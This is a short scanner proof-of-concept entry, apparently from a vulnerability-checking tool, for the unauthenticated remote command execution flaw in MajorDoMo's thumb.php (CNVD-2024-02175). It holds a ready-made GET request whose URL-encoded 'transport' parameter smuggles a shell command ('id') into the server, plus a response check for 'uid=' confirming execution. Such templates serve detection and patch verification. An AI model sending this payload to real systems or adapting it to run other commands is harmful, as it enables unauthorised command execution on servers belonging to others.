{
        'name': 'MajorDoMo thumb.php 未授权RCE漏洞(CNVD-2024-02175)',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
                'Accept-Charset': 'utf-8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'uid='
        }}]
    }